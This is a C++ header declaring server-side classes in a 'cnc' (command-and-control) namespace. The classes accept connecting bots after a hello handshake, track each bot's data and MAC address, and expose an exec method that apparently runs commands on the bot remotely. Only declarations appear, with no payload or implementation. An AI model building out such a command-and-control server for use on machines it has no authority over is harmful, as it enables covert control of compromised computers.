#pragma once
#include <common/bot_send.h>
#include <boost/asio/ip/tcp.hpp>
#include <queue>
#include <functional>
#include <variant>
#include <string>

namespace cnc { namespace server {
		class potential_client
		{
			bool m_hello_received = false;
			bool m_closed = false;

		public:
			template<class T>
			using awaitable_type = common::bot_send::awaitable_type<T>;
			using socket_type = common::bot_send::socket_type;

		protected:
			boost::asio::ip::tcp::socket m_socket;

		public:
			potential_client(socket_type socket);
			potential_client(potential_client &&) = default;
			potential_client &operator=(potential_client &&) = default;
			~potential_client();

			awaitable_type<common::bot_protocol::hello_data> recv_hello();
			awaitable_type<void> reject(const std::string &reason);
			awaitable_type<void> accept();

			boost::asio::ip::address ip() const;

		protected:
			void close();
		};

		class client : public potential_client
		{
			bool m_running = false;
			bool m_stopping = false;
			bool m_quit = false;
			common::bot_protocol::hello_data m_data;
			//std::queue<event> m_exec_queue;

		public:
			client(potential_client session, common::bot_protocol::hello_data hello_data);
			client(client &&) = default;
			client &operator=(client &&) = default;

			awaitable_type<void> run();
			void stop();

			bool quit() const { return m_quit; }
			bool stopping() const { return m_stopping; }

			const common::bot_protocol::hello_data &data() const { return m_data; }
			const common::mac_addr &mac() const { return m_data.mac; }

			awaitable_type<std::string> exec(const std::string &cmd);
		};
	}
}